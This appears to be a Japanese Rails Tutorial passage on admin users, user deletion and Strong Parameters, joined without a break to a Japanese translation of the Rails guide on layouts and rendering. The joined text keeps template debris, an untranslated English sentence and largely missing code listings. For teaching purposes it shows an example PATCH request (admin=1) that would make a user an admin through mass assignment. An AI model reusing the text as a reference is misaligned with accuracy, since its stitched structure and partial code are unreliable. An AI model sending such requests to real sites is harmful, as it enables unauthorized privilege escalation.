特権を持つ管理ユーザーを識別するために、論理値をとる\kode{admin}属性をUserモデルに追加します。この後で説明しますが、こうすると自動的に\kode{admin?}メソッド (論理値を返す) も使えるようになりますので、これを使用して管理ユーザーの状態をテストできます。
変更後のデータモデルは図\ref{fig:user_model_admin}のようになります。
論理値をとる\kode{admin}属性が追加されたUserモデル
マイグレーションを実行すると\kode{admin}カラムが\kode{users}テーブル (リスト\ref{code:admin_migration}) に追加されます。
リスト\ref{code:admin_migration}では、\kode{default: false}という引数を\kode{add\_column}に追加しています。これは、デフォルトでは管理者に\emph{なれない}ということを示すためです
(\kode{default: false}引数を与えない場合、 \kode{admin}の値はデフォルトで\kode{nil}になりますが、これは\kode{false}と同じ意味ですので、必ずしもこの引数を与える必要はありません。
ただし、このように明示的に引数を与えておけば、コードの意図をRailsと開発者に明確に示すことができます)。
boolean型の\kode{admin}属性をUserに追加するマイグレーション
後はいつものようにマイグレーションを実行します。
Rails consoleで動作を確認すると、期待どおり\kode{admin}属性が追加されて論理値をとり、さらに疑問符の付いた\kode{admin?}メソッドも利用できるようになっています。
ここでは\kode{toggle!}メソッドを使用して \kode{admin}属性の状態を\kode{false}から\kode{true}に反転しています。
仕上げに、最初のユーザーだけをデフォルトで管理者にするようサンプルデータを更新しましょう (リスト\ref{code:populator_with_admin})。
サンプルデータ生成タスクに管理者を1人追加する
次に、データベースをリセットして、サンプルデータを再度生成します。
Strong Parameters、再び
リスト\ref{code:populator_with_admin}では、初期化ハッシュに\kode{admin: true}を設定することでユーザーを管理者にしていることにお気付きになりましたでしょうか。
ここでは、荒れ狂うWeb世界にオブジェクトをさらすことの危険性を改めて強調しています。もし、任意のWebリクエストの初期化ハッシュをオブジェクトに渡せるとなると、攻撃者は以下のような\texttt{PATCH}リクエストを送信してくるかもしれません
\texttt{curl}などのコマンドラインツールを使用すると、\texttt{PATCH}リクエストをこの形式で送信することができます。
patch /users/17?
admin=1
このリクエストは、17番目のユーザーを管理者に変えてしまいます。ユーザーのこの行為は、少なくとも重大なセキュリティ違反となる可能性がありますし、実際にはそれだけでは済まないでしょう。
このような危険があるからこそ、編集してもよい安全な属性だけを更新することが重要になります。
\ref{sec:strong_parameters}で説明したとおり、\emph{Strong Parameters}を使用してこれを行います。具体的には、 以下のように\kode{params}ハッシュに対して\kode{require}と\kode{permit}を呼び出します。
上のコードでは、許可された属性リストに\kode{admin}が含まれて\emph{いない}ことに注目してください。
これにより、任意のユーザーが自分自身にアプリケーションの管理者権限を与えることを防止できます。
この問題は重大であるため、編集可能になってはならない属性に対するテストを作成することをぜひともお勧めします。\kode{admin}属性のテストについては演習に回します (\ref{sec:updating_deleting_exercises})。
Usersリソースの最後の仕上げとして、\kode{destroy}アクションへのリンクを追加しましょう。
まず、ユーザーインデックスページの各ユーザーに削除用のリンクを追加し、続いて管理ユーザーへのアクセスを制限します。
これによって、現在のユーザーが管理者のときに限り \kode{[delete]} リンクが表示されるようになります (リスト\ref{code:delete_links})。
ユーザー削除用リンクの実装 (管理者にのみ表示される)
ここで、必要な\kode{DELETE}リクエストを発行するリンクの生成は\texttt{method: :delete}引数によって行われている点に注目してください。 argument, which arranges for the link to issue the necessary \kode{DELETE} request. We’ve also wrapped each link inside an \texttt{if} statement so that only admins can see them.
管理者から見えるページを図\ref{fig:index_delete_links_rails_3}に示します。
ブラウザはネイティブでは\texttt{DELETE}リクエストを送信できないため、RailsではJavaScriptを使用してこれを偽造します。
つまり、JavaScriptがオフになっているとユーザー削除のリンクも無効になるということです。
JavaScriptをサポートしないブラウザをサポートする必要がある場合は、フォームと\texttt{POST}リクエストを使用して\texttt{DELETE}リクエストを偽造することもできます。こちらはJavaScriptがなくても動作します
詳しくはRailsCastの “\href{http://railscasts.com/episodes/77-destroy-without-javascript}{JavaScriptを使わない削除}” (英語) を観てください。
ユーザー一覧ページに削除用リンクが表示される
この削除リンクが動作するためには、\kode{destroy}アクション (表\ref{table:RESTful_users}) を追加する必要があります。このアクションでは、該当するユーザーを見つけてActive Recordの\kode{destroy}メソッドを使用して削除し、最後にユーザーインデックスに移動します (リスト\ref{code:destroy_action})。
ユーザーを削除するためにはログインしていなくてはならないので、リスト\ref{code:destroy_action}では\kode{:destroy}アクションも\kode{logged\_in\_user}フィルターに追加しています。
実際に動作する\kode{destroy}アクションを追加する
\kode{destroy}アクションでは、\kode{find}メソッドと\kode{destroy}メソッドを1行で書くために2つのメソッドを連結 (chain) している点に注目してください。
結果として、管理者だけがユーザーを削除できるようになります (より具体的には、削除リンクが見えているユーザーのみ削除できる)。しかし、実はまだ大きなセキュリティホールがあります。ある程度の腕前を持つ攻撃者なら、コマンドラインで\texttt{DELETE}リクエストを直接発行するという方法でサイトの全ユーザーを削除してしまうことができるでしょう。
サイトを正しく防衛するには、\kode{destroy}アクションにもアクセス制御を行う必要があります。これを実装してようやく、管理者\emph{だけが}ユーザーを削除できるようにします。
\ref{sec:requiring_logged_in_users}と\ref{sec:requiring_the_right_user}と同じように、今回はbeforeフィルターを使って\kode{destroy}アクションへのアクセスを制御します。
実装する\kode{admin\_user}フィルターをリスト\ref{code:admin_destroy_before_filter}に示します。
beforeフィルターで\kode{destroy}アクションを管理者だけに限定する
# 管理者かどうか確認
ユーザー削除と同じくらい重要なことは、その振る舞いが期待されたかどうかを確かめる良いテストを書くことです。
そこで、まずはユーザー用fixtureファイルを修正し、今いるサンプルユーザーの一人を管理者にしてみます (リスト\ref{code:fixture_user_admin})。
fixture内の最初のユーザーを管理者にする
\ref{sec:requiring_logged_in_users}で経験してきたように、Usersコントローラをテストするために、アクション単位でアクセス制御をテストします。
リスト\ref{code:user_logout_test}のログアウトのテストと同様に、\kode{削除}をテストするために、\texttt{DELETE}リクエストを発行して\kode{destroy}アクションを直接動作させます。
このとき2つのケースをチェックします。1つは、ログインしていないユーザーであれば、ログイン画面にリダイレクトされることです。もう1つは、ログイン済みではあっても管理者でなければ、ホーム画面にリダイレクトされることです。
作成したコードをリスト\ref{code:action_tests_admin}に示します
管理者権限の制御をアクションレベルでテストする 
このとき、リスト\ref{code:action_tests_admin}では\kode{assert\_no\_difference}メソッド (リスト\ref{code:a_test_for_invalid_submission}) を使って、ユーザー数が変化しないことを確認している点に注目してください。
リスト\ref{code:action_tests_admin}のテストでは、管理者ではないユーザーの振る舞いについて検証していますが、管理者ユーザーの振る舞いと一緒に確認できるとよさそうです。
そこで、管理者であればユーザー一覧画面に削除リンクが表示される仕様を利用して、リスト\ref{code:user_index_test}のテストに今回のテストを追加していくことにします。これにより、後ほど追加する管理者の振る舞いについても簡単にテストが書けそうです。
さて、今回のテストで唯一の手の込んだ箇所は、管理者が削除リンクをクリックしたときに、ユーザーが削除されたことを確認する部分です。今回は次のようなテストでこれを実現しました。
したがって、管理者や一般ユーザーのテスト、そしてページネーションや削除リンクのテストをすべてまとめると、リスト\ref{code:delete_link_integration_test}のようになります。
削除リンクとユーザー削除に対する統合テスト 
リスト\ref{code:delete_link_integration_test}では各ユーザーの削除リンクをテストするときに、ユーザーが管理者であればスキップしている点にも注目してください (これはリスト\ref{code:delete_links}により、管理者であれば削除リンクが表示されないからです)。
これで、削除に関するコードに対して、よくテストできている状態になりました。テストスイートを走らせると \passing\ するはずです。
\ref{sec:user_signup}でUsersコントローラをご紹介して以来、長い道のりをたどってきました。
あの頃はユーザー登録すらありませんでしたが、今は登録もログインもログアウトもできます。プロフィールの表示も、設定の編集も、すべてのユーザーの一覧画面もあります。さらに、一部のユーザーは他のユーザーを削除することすらできるようになりました。
この時点で、サンプルアプリケーションはWebサイトとしての十分な基盤 (ユーザーを認証したり認可したり) が整ったといえるでしょう。
{0}{1}第10章{/1}{/0}では、さらに2つの改善を加えます。メールアドレスを使ってアカウントを有効化する機能と (すなわち本当に有効なメールアドレスか検証するプロセスと)、ユーザーがパスワードを忘れてしまったときのためのパスワードリセット機能です。
次の章に進む前に、すべての変更をmasterブランチにマージしておきましょう。
アプリケーションを本番展開したり、サンプルデータを本番データとして作成することもできます (本番データベースをリセットするには\kode{pg:reset}タスクを使用します)。
もちろん、実際のWebサイトではサンプルデータを生成したくないという人もいるかと思いますが、これには理由があります (図\ref{fig:heroku_sample_users})。
それは、図\ref{fig:heroku_sample_users}が示すように、サンプルユーザーの表示順序が変化してしまい、図\ref{fig:user_index_pagination}にあるようなローカル環境での表示順序と異なってしまうことです。これは現時点ではまだデフォルトの表示順序が指定されていないことが原因です。 結果として、データベースの内容に応じて表示順序が異なってしまいます。
それだけのことかと思われるかもしれませんが、これは今後マイクロポストを実装するときに問題となります。なお、この問題については\ref{sec:ordering_and_dependency}で解決していきます。
本番環境のユーザー一覧ページ
\label{fig:heroku_sample_users}}<n>\end{figure}<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:updating_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
ユーザーは、編集フォームから\texttt{PATCH}リクエストを\kode{update}アクションに対して送信し、情報を更新する
Strong Parametersを使うことで、安全にWeb上から更新させることができる
beforeフィルターを使うと、特定のアクションが実行される直前にメソッドを呼び出すことができる
beforeフィルターを使って、認可 (アクセス制御) を実現した
認可に対するテストでは、特定のHTTPリクエストを直接送信する低級なテストと、ブラウザの操作をシミュレーションする高級なテスト (統合テスト) の2つを利用した
フレンドリーフォワーディングとは、ログイン成功時に元々行きたかったページに転送させる機能である
ユーザー一覧ページでは、すべてのユーザーをページ毎に分割して表示する
\kode{rake db:seed}コマンドは、\kode{db/seeds.rb}にあるサンプルデータをデータベースに流し込む
論理属性\kode{admin}を追加すると、自動的に\kode{user.admin?}メソッドが使えるようになる
管理者が削除リンクをクリックすると、\texttt{DELETE}リクエストが\kode{destroy}アクションに向けて送信され、該当するユーザーが削除される
fixtureファイル内で埋め込みRubyを使うと、多量のテストユーザーを作成することができる
フレンドリーフォワーディングで、最初に与えられたURLにのみ確実に転送されていることを確認するテストを作成してください。
続けてログインを行った後、転送先のURLはデフォルト (プロフィール画面) に戻る必要もありますので、これもテストで確認してください。
レイアウトにあるすべてのリンクに対して統合テストを書いてみましょう。ログイン済みユーザーとそうでないユーザーのそれぞれに対して、正しい振る舞いを考えてください。
\emph{ヒント}: {1}log_in_as{/1}ヘルパーを使ってリスト{p2}にテストを追加してみましょう。
Web経由で\texttt{admin}属性を変更できないことを確認してください。\kode{{2}リスト9.59{/2}}に示したように、{3}PATCH{/3}リクエストを \texttt{update}メソッドに直接発行するテストを作成してください。
このコードはリスト\ref{code:new_user_with_partial}で使用されていました。もうひとつ、
\kode{admin}属性の変更が禁止されていることをテストする
newビューをパーシャル化する
本ガイドでは、Action ControllerとAction Viewによる基本的なレイアウト機能について解説します。
* Railsに組み込まれているさまざまなレンダリング (=レスポンスの出力) 方法の使い方
* コンテンツが複数のセクションからなるレイアウト作成法
* パーシャルを使用してビューをDRYにする方法
* レイアウトをネストする方法 (サブテンプレート)
概要: 部品を組み上げる
本ガイドでは、コントローラ、ビュー、モデルによって形成される三角形のうち、コントローラとビューの間でのやりとりを中心に扱います。
ご存じのように、Railsのコントローラはリクエストを扱うプロセス全体の流れを組織的に調整する責任を負い、(ビジネスロジックのような) 重い処理はモデルの方で行なうのが普通です。
モデル側での処理が完了し、ユーザーに結果を表示する時がきたら、コントローラは処理結果をビューに渡します。
このときの、コントローラからビューへの結果の渡し方こそが本ガイドの主なトピックです。
大きな流れとしては、ユーザーへのレスポンスとして送信すべき内容を決定することと、ユーザーへのレスポンスを作成するために適切なメソッドを呼び出すこともこの作業に含まれます。
ユーザーに返すレスポンス画面を完全なビューにするのであれば、Railsはそのビューをさらに別のレイアウトでラッピングし、パーシャルビューとして取り出すでしょう。
以後本ガイドではこれらの方法をすべて紹介します(訳注: 本ガイドではrenderを一般的な意味では「出力」、具体的な動作を指す場合は「レンダリング」と訳しています)。
レスポンスを作成する
コントローラ側から見ると、HTTPレスポンスの作成方法は以下の3とおりあります。
* `render`を呼び出し、ブラウザに返す完全なレスポンスを作成する
* `redirect_to`を呼び出し、HTTPリダイレクトコードステータスをブラウザに送信する
* `head`を呼び出し、HTTPヘッダーのみで構成されたレスポンスを作成してブラウザに送信する
### デフォルトの出力: アクションにおける「設定より規約」
Railsでは「設定より規約 (CoC: convention over configuration)」というポリシーが推奨されていることをご存じかと思います。
デフォルトの出力結果は、CoCのよい例でもあります。
Railsのコントローラは、デフォルトでは正しいルーティングに対応する名前を持つビューを自動的に選び、それを使用してレスポンスを出力します。
たとえば、`BooksController`というコントローラに以下のコードがあるとします。
class BooksController < ApplicationController
ルーティングファイルに以下が記載されているとします。
  resources :books
`app/views/books/index.html.erb`ビューファイルの内容が以下のようになっているとします。
<h1>Books are coming soon!
以上のようにすることで、ユーザーがブラウザで`/books`にアクセスすると、Railsは自動的に`app/views/books/index.html.erb`ビューを使用してレスポンスを出力し、その結果「Books are coming soon!」という文字が画面に表示されます。
しかしこの画面だけではほとんど実用性がないので、`Book`モデルを作成し、`BooksController`にindexアクションを追加してみましょう。
    @books = Book.all
上のコードでご注目いただきたいのは、「設定より規約」の原則が利いているおかげでindexアクションの最後で明示的に画面出力を指示する必要がないという点です。
ここでの原則は、「コントローラのアクションの最終部分で明示的な画面出力が指示されていない場合は、コントローラが使用できるビューのパスから`アクション名.html.erb`というビューテンプレートを探し、それを使用して自動的に出力する」というものです。
従って、この場合は`app/views/books/index.html.erb`ファイルが出力されます。
ビューですべての本の属性を表示したい場合は、以下のようにERBを書くことができます。
<h1>Listing Books</h1>
    <th>Summary</th>
    <th></th>
<% @books.each do |book| %>
    <td><%= book.title %></td>
    <td><%= book.content %></td>
    <td><%= link_to "Show", book %></td>
    <td><%= link_to "Edit", edit_book_path(book) %></td>
    <td><%= link_to "Remove", book, method: :delete, data: { confirm: "Are you sure?" 
<%= link_to "New book", new_book_path %>
NOTE: 実際のレンダリングは、`ActionView::TemplateHandlers`のサブクラスで行われます。
本ガイドではレンダリングの詳細については触れませんが、テンプレートハンドラの選択がビューテンプレートファイルの拡張子によって制御されているという重要な点は理解しておいてください。
Rails 2以降におけるビューテンプレートの標準拡張子は、ERB (HTML + eMbedded RuBy) でレンダリングする場合は`.erb`、Builder (XMLジェネレータ) でレンダリングする場合は`.builder`です。
### `render`を使用する
アプリケーションがブラウザで表示するコンテンツのレンダリング (出力) という力仕事は、`ActionController::Base#render`メソッドがほぼ一手に引き受けています。
`render`メソッドはさまざまな方法でカスタマイズできます。
Railsテンプレートのデフォルトビューを出力することもできますし、特定のテンプレート、ファイル、インラインコードを指定して出力したり、何も出力しないこともできます。
テキスト、JSON、XMLを出力することもできます。
出力されるレスポンスのcontent typeやHTTPステータスを指定することもできます。
TIP: 出力結果をブラウザで表示して調べることなく、`render`呼び出しの正確な結果を取得したい場合は、`render_to_string`を呼び出すことができます。
このメソッドの動作は`render`と完全に同じであり、出力結果をブラウザに返さずに文字列を返す点だけが異なります。
#### 何も出力しない方法
`render`メソッドでできる最も単純な動作は、何も出力しないことでしょう。
render nothing: true
このレスポンスをcurlコマンドを使用して調べてみると以下のようになっています。
$ curl -i 127.0.0.1:3000/books
HTTP/1.1 200 OK
Connection: close
Date: Sun, 24 Jan 2010 09:25:18 GMT
Content-Type: */*; charset=utf-8
X-Runtime: 0.014297
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache
レスポンスの内容は空欄になっています (`Cache-Control`行以降にデータがない) が、ステータスコートが200 OKになっているのでリクエストが成功していることがわかります。
何も出力しないというレスポンスは、Ajaxリクエストを使用する時に便利です。これを使用することで、リクエストが成功したという確認応答だけをブラウザに送り返すことができるからです。
TIP: 200 OKヘッダーだけを送信したいのであれば、ここでご紹介した`render :nothing`よりも、本ガイドで後述する`head`メソッドを使用する方がおそらくよいでしょう。
`head`メソッドは`render :nothing`よりも柔軟性が高く、HTTPヘッダーだけを生成していることが明確になるからです。
#### Action Viewを出力する
同じコントローラで、デフォルトと異なるテンプレートに対応するビューを出力したい場合は、`render`メソッドでビュー名を指定することができます。
  @book = Book.find(params[:id])
  if @book.update(book_params)
    redirect_to(@book)
    render "edit"
上の`update`アクションでモデルに対する`update`メソッドの呼び出しが失敗すると、同じコントローラに用意しておいた別の`edit.html.erb`テンプレートを使用して出力します。
出力するアクションを指定するには、文字列の他にシンボルを使用することもできます。
    render :edit
#### 別のコントローラからアクションのテンプレートを出力する
あるコントローラのアクションから、まったく別のコントローラの配下にあるテンプレートを使用して出力することは可能でしょうか。
これも`render`メソッドだけで行なうことができます。`render`メソッドには`app/views`を起点とするフルパスを渡すことができますので、出力したいテンプレートをフルパスで指定します。
たとえば、`app/controllers/admin`に置かれている`AdminProducts`コントローラのコードを実行しているとすると、`app/views/products`に置かれているビューテンプレートに対するアクションの実行結果を出力するには以下のようにします。
render "products/show"
パスにスラッシュ`/`が含まれていると、Railsによってこのビューは異なるコントローラの配下にあると認識されます。
異なるコントローラのテンプレートを指定していることをより明示的にしたい場合は、以下のように`:template`オプションを使用することもできます (Rails 2.2以前ではこのオプションは必須でした)。
render template: "products/show"
#### 任意のファイルを使用して出力する
render file: "/u/apps/warehouse_app/current/app/views/products/show"
`:file`オプションに与えるパスは、ファイルシステムの絶対パスです。
当然ながら、コンテンツを出力したいファイルに対して適切なアクセス権が与えられている必要があります。
TIP: Microsoft Windows上でRailsを実行している場合、ファイルを出力する際に`:file`オプションを省略できません。Windowsのファイル名フォーマットはUnixのファイル名と同じではないためです。
#### まとめ
これまでご紹介した3通りの出力方法 (コントローラ内の別テンプレートを使用、別のコントローラのテンプレートを使用、ファイルシステム上の任意のファイルを使用) は、実際には同一のアクションのバリエーションにすぎません。
実のところ、たとえばBooksControllerクラスのupdateアクション内で、本の更新に失敗したらeditテンプレートを出力したいとすると、以下のどのレンダリング呼び出しを行っても最終的には必ず`views/books`ディレクトリの`edit.html.erb`を使用して出力が行われます。
render :edit
render action: :edit
render "edit"
render "edit.html.erb"
render action: "edit"
render action: "edit.html.erb"
render "books/edit"
render "books/edit.html.erb"
render template: "books/edit"
render template: "books/edit.html.erb"
render "/path/to/rails/app/views/books/edit"
render "/path/to/rails/app/views/books/edit.html.erb"
render file: "/path/to/rails/app/views/books/edit"
render file: "/path/to/rails/app/views/books/edit.html.erb"
どの呼び出しを使用するかはコーディングのスタイルと規則の問題でしかありませんが、経験上なるべくシンプルな記法を使用する方がコードがわかりやすくなるでしょう。
#### `render`で`:inline`オプションを使用する
`render`メソッドは、メソッド呼び出しの際に`:inline`オプションを使用してERBを与えると、ビューがまったくない状態でも実行することができます。
これは完全に有効な方法です。
render inline: "<% products.each do |p| %><p><%= p.name %></p><% end %>"
WARNING: このオプションを実際に使用する意味はほぼないと思われます。
コントローラのコードにERBを混在させると、RailsのMVC指向が崩されるだけでなく、開発者がプロジェクトのロジックを追いかけることが困難になってしまいます。
通常のERBビューを使用してください。
インラインでは、デフォルトでERBを使用して出力を行います。
`:type`オプションで:builderを指定すると、ERBに代えてBuilderが使用されます。
render inline: "xml.p {'Horrid coding practice!'}", type: :builder
#### テキストを出力する
`render`で`:plain`オプションを使用すると、平文テキストをマークアップせずにブラウザに送信することができます。
render plain: "OK"
TIP: 平文テキストの出力は、AjaxやWebサービスリクエストに応答するときに最も有用です。これらではHTML以外の応答を期待しています。
NOTE: デフォルトでは、`:plain`オプションを使用すると出力結果に現在のレイアウトが適用されません。
#### HTMLを出力する
`render`で`:html`オプションを使用すると、HTML文字列を直接ブラウザに送信することができます。
render html: "<strong>Not Found</strong>".html_safe
TIP: この手法は、HTMLコードのごく小規模なスニペットを出力したい場合に便利です。
スニペットのマークアップが複雑になるようであれば、早めにテンプレートファイルに移行することをご検討ください。
#### JSONを出力する
JSONはJavaScriptのデータ形式の一種で、多くのAjaxライブラリで使用されています。
Railsでは、オブジェクトからJSON形式への変換と、変換されたJSONをブラウザに送信する機能がビルトインでサポートされています。
render json: @product
TIP: 出力するオブジェクトに対して`to_json`を呼び出す必要はありません。
`:json`オプションが指定されていれば、`render`によって`to_json`が自動的に呼び出されるようになっています。
#### XMLを出力する
Railsでは、オブジェクトからXML形式への変換と、変換されたXMLをブラウザに送信する機能がビルトインでサポートされています。
render xml: @product
TIP: 出力するオブジェクトに対して`to_xml`を呼び出す必要はありません。
`:xml`オプションが指定されていれば、`render`によって`to_xml`が自動的に呼び出されるようになっています。
#### Vanilla JavaScriptを出力する
Railsはvanilla JavaScriptを出力することもできます。
render js: "alert('Hello Rails');"
上のコードは、引数で与えられた文字列をMIMEタイプ`text/javascript`でブラウザに送信します。
#### 生のコンテンツを出力する
`render`で`:body`オプションを指定することで、content typeを一切指定しない生のコンテンツをブラウザに送信することができます。
render body: "raw"
TIP: このオプションを使用するのは、レスポンスのcontent typeがどんなものであってもよい場合のみにしてください。
ほとんどの場合、`:plain`や`:html`などを使用する方が適切です。
#### `render`のオプション
`render`メソッドに対する呼び出しでは、一般に以下の4つのオプションが使用できます。
* `:content_type`
* `:layout`
* `:location`
* `:status`
##### `:content_type`オプション
Railsがデフォルトで出力する結果のMIME content-typeは、デフォルトで`text/html`になります (ただし`:json`を指定した場合には`application/json`、`:xml`を使用した場合は`application/xml`になります)。
content-typeを変更したい場合は、`:content_type`オプションを指定します。
render file: filename, content_type: "application/rss"
##### `:layout`オプション
`render`で指定できるほとんどのオプションでは、出力されるコンテンツは現在のレイアウトの一部としてブラウザ上で表示されます。
これより、レイアウトの詳細と利用法について本ガイドで説明します。
`:layout`オプションを指定すると、現在のアクションに対して特定のファイルをレイアウトとして使用します。
render layout: "special_layout"
出力時にレイアウトをまったく使用しないよう指定することもできます。
render layout: false
##### `:location`オプション
`:location`を使用することで、HTTPの`Location`ヘッダーを設定できます。
render xml: photo, location: photo_url(photo)
##### `:status`オプション
Railsが返すレスポンスのHTTPステータスコードは自動的に生成されます (ほとんどの場合`200 OK`となります)。
`:status`オプションを使用することで、レスポンスのステータスコードを変更できます。
render status: 500
render status: :forbidden
ステータスコードは数字で指定する他に、以下に示すシンボルで指定することもできます。
| レスポンスクラス      | HTTPステータスコード | シンボル                           |
| ------------------- | ---------------- | -------------------------------- |
| **Informational**   | 100              | :continue                        |
|                     | 101              | :switching_protocols             |
|                     | 102              | :processing                      |
| **Success**         | 200              | :ok                              |
|                     | 201              | :created                         |
|                     | 202              | :accepted                        |
|                     | 203              | :non_authoritative_information   |
|                     | 204              | :no_content                      |
|                     | 205              | :reset_content                   |
|                     | 206              | :partial_content                 |
|                     | 207              | :multi_status                    |
|                     | 208              | :already_reported                |
|                     | 226              | :im_used                         |
| **Redirection**     | 300              | :multiple_choices                |
|                     | 301              | :moved_permanently               |
|                     | 302              | :found                           |
|                     | 303              | :see_other                       |
|                     | 304              | :not_modified                    |
|                     | 305              | :use_proxy                       |
|                     | 306              | :reserved                        |
|                     | 307              | :temporary_redirect              |
|                     | 308              | :permanent_redirect              |
| **Client Error**    | 400              | :bad_request                     |
|                     | 401              | :unauthorized                    |
|                     | 402              | :payment_required                |
|                     | 403              | :forbidden                       |
|                     | 404              | :not_found                       |
|                     | 405              | :method_not_allowed              |
|                     | 406              | :not_acceptable                  |
|                     | 407              | :proxy_authentication_required   |
|                     | 408              | :request_timeout                 |
|                     | 409              | :conflict                        |
|                     | 410              | :gone                            |
|                     | 411              | :length_required                 |
|                     | 412              | :precondition_failed             |
|                     | 413              | :request_entity_too_large        |
|                     | 414              | :request_uri_too_long            |
|                     | 415              | :unsupported_media_type          |
|                     | 416              | :requested_range_not_satisfiable |
|                     | 417              | :expectation_failed              |
|                     | 422              | :unprocessable_entity            |
|                     | 423              | :locked                          |
|                     | 424              | :failed_dependency               |
|                     | 426              | :upgrade_required                |
|                     | 428              | :precondition_required           |
|                     | 429              | :too_many_requests               |
|                     | 431              | :request_header_fields_too_large |
| **Server Error**    | 500              | :internal_server_error           |
|                     | 501              | :not_implemented                 |
|                     | 502              | :bad_gateway                     |
|                     | 503              | :service_unavailable             |
|                     | 504              | :gateway_timeout                 |
|                     | 505              | :http_version_not_supported      |
|                     | 506              | :variant_also_negotiates         |
|                     | 507              | :insufficient_storage            |
|                     | 508              | :loop_detected                   |
|                     | 510              | :not_extended                    |
|                     | 511              | :network_authentication_required |
#### レイアウトの探索順序
Railsは現在のレイアウトを探索する場合、最初に現在のコントローラと同じ基本名を持つレイアウトが`app/views/layouts`ディレクトリにあるかどうかを調べます。
たとえば、`PhotosController`クラスのアクションから出力するのであれば、`app/views/layouts/photos.html.erb`または`app/views/layouts/photos.builder`を探します。
該当のコントローラに属するレイアウトがない場合、`app/views/layouts/application.html.erb`または`app/views/layouts/application.builder`を使用します。
`.erb`レイアウトがない場合、`.builder`レイアウトがあればそれを使用します。
Railsには、各コントローラやアクションに割り当てる特定のレイアウトをもっと正確に指定する方法がいくつも用意されています。
##### コントローラ用のレイアウトを指定する
`layout`宣言を使用することで、デフォルトのレイアウト名ルールを上書きすることができます。
class ProductsController < ApplicationController
  layout "inventory"
  #...
この宣言によって、`ProductsController`からの出力で使用されるレイアウトは`app/views/layouts/inventory.html.erb`になります。
アプリケーション全体で特定のレイアウトを使用したい場合は、`ApplicationController`クラスで`layout`を宣言します。
class ApplicationController < ActionController::Base
  layout "main"
この宣言によって、アプリケーションのすべてのビューで使用されるレイアウトは`app/views/layouts/main.html.erb`になります。
##### 実行時にレイアウトを指定する
レイアウトの指定にシンボルを使用することで、リクエストが実際に処理されるときまでレイアウトを確定せず、選択を遅延することができます。
  layout :products_layout
    @product = Product.find(params[:id])
    def products_layout
      @current_user.special? ? 
"special" : "products"
上のコードは、現在のユーザーが特別なユーザーの場合、そのユーザーが製品ページを見るときに特別なレイアウトを適用します。
レイアウトを決定する際に、Procなどのインラインメソッドを使用することもできます。
たとえばProcオブジェクトを渡すと、Procを渡されたブロックには`controller`インスタンスが渡されます。これにより、現在のリクエストを元にしてレイアウトを決定することができます。
##### 条件付きレイアウト
コントローラレベルで指定されたレイアウトでは、`:only`オプションと`:except`オプションがサポートされています。
これらのオプションは、単一のメソッド名またはメソッド名の配列を引数として受け取ります。渡すメソッド名はコントローラ内のメソッド名に対応します。
上の宣言によって、`rss`メソッドと`index`メソッド以外のすべてのメソッドに`product`レイアウトが適用されます。
##### レイアウトの継承
レイアウト宣言は下の階層に継承されます。下の階層、つまりより具体的なレイアウト宣言は、上の階層、つまりより一般的なレイアウトよりも常に優先されます。
* `application_controller.rb`
      layout "main"
      layout "special"
      layout false
      def show
        render layout: "old"
      # ...
上のアプリケーションは以下のように動作します。
* ビューの出力には基本的に`main`レイアウトが使用されます。
#### 二重レンダリングエラーを避ける
Rails開発をやっていれば、一度は "Can only render or redirect once per action" エラーに遭遇したことがあるでしょう。
いまいましいエラーですが、修正は比較的簡単です。
このエラーはほとんどの場合、開発者が`render`メソッドの基本的な動作を誤って理解していることが原因です。
このエラーを発生する以下のコードを例にとって説明しましょう。
  if @book.special?
    render action: "special_show"
  render action: "regular_show"
`@book.special?`が`true`の場合、Railsはレンダリングを開始し、`@book`変数を`special_show`ビューに転送します。
しかし、`show`アクションのコードはそこで _止まらない_ ことにご注意ください。`show`アクションのコードは最終行まで実行され、`regular_show`ビューのレンダリングを行おうとした時点でエラーが発生します。
解決法はいたって単純です。1つのコード実行パス内では、`render`メソッドや`redirect`メソッドの実行は1度だけにしてください。
ここで非常に便利なのが`and return`というメソッドです。
このメソッドを使用して修正したバージョンを以下に示します。
    render action: "special_show" and return
`&& return`ではなく`and return`を使用してください。`&& return`はRuby言語の&&演算子の優先順位が高すぎてこの文脈では正常に動作しません。
RailsにビルトインされているActionControllerが行なう暗黙のレンダリングでは、`render`メソッドが呼び出されたかどうかを確認してからレンダリングを開始します。従って、以下のコードは正常に動作します。
上のコードは、ある本が`special?`である場合にのみ`special_show`テンプレートを使用して出力します。それ以外の場合は`show`テンプレートを使用して出力します。
### `redirect_to`を使用する
HTTPリクエストにレスポンスを返すもう一つの方法は、`redirect_to`を使用することです。
前述のとおり、`render`はレスポンス構成時にどのビュー (または他のアセット) を使用するかを指定するためのものです。
`redirect_to`メソッドは、この点において`render`メソッドと根本的に異なります。`redirect_to`メソッドは、別のURLに対して改めてリクエストを再送信するよう、ブラウザに指令を出すためのものです。
たとえば以下の呼び出しを行なうと、アプリケーションで現在どのページが表示されていても、写真のインデックス表示ページにリダイレクトされます。
redirect_to photos_url
`redirect_to`の引数にはどんな値も指定できますが、`link_to`や`url_for`を使用するのが普通です。
ユーザーを直前のページに戻す、特殊なリダイレクトも行えます。
redirect_to :back
#### リダイレクトのステータスコードを変更する
`redirect_to`を呼び出すと、一時的なリダイレクトを意味するHTTPステータスコード302がブラウザに返され、ブラウザはそれに基いてリダイレクトを行います。
別のステータスコード (301: 恒久的なリダイレクトがよく使われます) に変更するには`:status`オプションを使用します。
redirect_to photos_path, status: 301
`render`の`:status`オプションの場合と同様、`redirect_to`の`:status`もヘッダーを指定する時に数値の他にシンボルも使用できます。
#### `render`と`redirect_to`の違い
ときおり、`redirect_to`を一種の`goto`コマンドとして理解している開発初心者を見かけます。Railsコードの実行位置をある場所から別の場所に移動するコマンドであると考えているわけです。
これは _正しくありません_ 。
`redirect_to`を実行した後、コードはそこで実行を終了し、ブラウザからの次のリクエストを待ちます (通常のスタンバイ状態)。
その直後、`redirect_to`でブラウザに送信したHTTPステータスコード302に従って、ブラウザから別のURLへのリクエストがサーバーに送信され、サーバーはそのリクエストを改めて処理します。それ以外のことは行っていません。
`render`と`redirect_to`の違いを以下のアクションで比較してみましょう。
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    render action: "index"
上のフォームのコードでは、`@book`インスタンス変数が`nil`場合に問題が生じる可能性があります。
`render :action`は対象となるアクションのコードを実行しないことを思い出してください。従って、`index`ビューでおそらく必要となる`@books`インスタンス変数には何も設定されず、空の蔵書リストが表示されてしまいます。
